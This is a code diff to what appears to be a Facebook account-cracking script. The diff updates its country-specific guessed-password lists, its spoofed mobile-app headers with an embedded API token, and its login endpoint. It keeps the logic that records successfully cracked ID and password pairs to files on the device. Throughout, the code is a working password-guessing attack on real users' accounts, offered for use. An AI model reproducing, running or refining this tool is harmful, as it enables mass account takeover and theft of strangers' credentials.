@@ -232,7 +232,7 @@ def remove_symbols_and_spaces(input_string):
     return cleaned_string
 
 
- 
+    
                
 
 
@@ -240,8 +240,8 @@ def menu():
                 clear()
                 x = ("***")
                 if x == ("***"):
-                        print('[1] File Clonning')
-                        print('[2] Random Clonning ')
+                        print('[1] File Clonning ')
+                        print('[2] Random Clonning')
                         print('[3] Gmail Clonning')
                         print('[4] Follow Facebook')
                         print('[0] EXIT ')
@@ -251,7 +251,7 @@ def menu():
                         if xd in ['1','01']:
                                 clear()
                                 
-                                print(' PUT FILE EXAMPLE :  /sdcard/File.ind-king.etc..')
+                                print(' PUT FILE EXAMPLE :  /sdcard/File.trt.etc..')
                                 linex()
                                 file = input(' PUT FILE PATH\033[1;37m: ')
                                 try:
@@ -261,7 +261,7 @@ def menu():
                                         time.sleep(1)
                                         menu()
                                 clear()
-                                print('[1] METHOD 1')
+                                print('[1] METHOD  1')
                                 print('[2] METHOD 2')
                                 print('[3] METHOD 3')
                                 linex()
@@ -292,8 +292,8 @@ def menu():
                                         clear()
                                         total_ids = str(len(fo))
                                         
-                                        print('[•] TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
-                                        print('[•] CRACKING STARTED...\033[1;37m')
+                                        print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
+                                        print("\033[1;37m CRACKING STARTED...\033[1;37m")
                                         linex()
                                         for user in fo:
                                                 ids,names = user.split('|')
@@ -349,13 +349,13 @@ def pak():
                         clear()
                         
                         tl = str(len(user))
-                        print('\033[1;33m[\033[1;32m•\033[1;33m] Total accounts: \033[1;97m'+tl)
-                        print('\033[1;33m[\033[1;32m•\033[1;33m] Select code: \033[1;97m '+code)
-                        print('\033[1;33m[\033[1;32m•\033[1;33m] Process has been started \033[1;97m')
+                        print('[+] Total accounts: \033[1;97m'+tl)
+                        print('[+] Select code: \033[1;97m '+code)
+                        print('[+] Process has been started \033[1;97m')
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'firstlast123','firslast','first123','pak123','first1234''firstlast1234','firstlast12345', ]
+                                passlist = [psx,ids,'khankhan','malik123','kingkhan','baloch123','pak123','khan123', 'baloch' ]
                                 TRT.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -386,7 +386,7 @@ def bd():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'first last','firstlast','free fire','freefire','f','57273200']
+                                passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200']
                                 TRT.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -449,7 +449,7 @@ def ind():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'57273200','firstlast','57575751','59039200','first last','57575752']
+                                passlist = [psx,ids,'57273200','hindustan']
                                 TRT.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -494,7 +494,7 @@ def gmail():
                         total = str(len(fo))
                         clear()
                         print(' Total account : \033[1;32m'+total)
-                        print("\033[1;37m \033[1;33m[\033[1;32m•\033[1;33m]Use flight ✈ mode for speed up\033[1;37m")
+                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                         linex()
                         for user in fo:
                                 ids,names = user.split('|')
@@ -561,10 +561,10 @@ def ffb(ids,names,passlist):
                         li2 = random.choice(li)
                         j1 = ''.join(random.choice(digits) for _ in range(2))
                         jazoest = li2+j1
-                        head = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
+                        head = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                         data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'pt_BR','client_country_code': 'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
 			
-                        url = 'https://graph.facebook.com/auth/login'
+                        url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=head).json()
                         if 'session_key' in po:
@@ -580,7 +580,7 @@ def ffb(ids,names,passlist):
                                                 print('\r\r \033[1;34m[XAYUS-KING-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
-                        elif 'graph.facebook.com' in po['error']['message']:
+                        elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
                                                 print('\r\r\x1b[1;31m [ALONE-XAYUS-KING-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/XAYUS-KING-CP.txt','a').write(ids+'|'+pas+'\n')
@@ -593,8 +593,6 @@ def ffb(ids,names,passlist):
                         else:
                                         continue
                 loop+=1
-                
-                
         except Exception as e:
                 pass
 xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
@@ -652,7 +650,7 @@ def api(ids,names,passlist):
                         jazoest = li2+j1
                         data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'pt_BR','client_country_code': 'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                         headers={'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
-                        url = 'https://graph.facebook.com./auth/login'
+                        url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
@@ -665,7 +663,7 @@ def api(ids,names,passlist):
                                                 print('\r\r \033[1;34m[XAYUS-KING-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
-                        elif 'graph.facebook.com' in po['error']['message']:
+                        elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
                                                 print('\r\r\x1b[1;31m [ALONE-XAYUS-KING-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/XAYUS-KING-CP.txt','a').write(ids+'|'+pas+'\n')
@@ -745,7 +743,7 @@ def api1(ids,names,passlist):
                                 'Content-Type': 'application/x-www-form-urlencoded',
                                 'X-FB-HTTP-Engine': 'Liger'
                                 }
-                        url = 'https://graph.facebook.com/auth/login'
+                        url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
@@ -828,7 +826,7 @@ def rndm(ids,passlist):
                         jazoest = li2+j1
                         data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                         headers=  {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
-                        url = 'https://graph.facebook.com/auth/login'
+                        url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
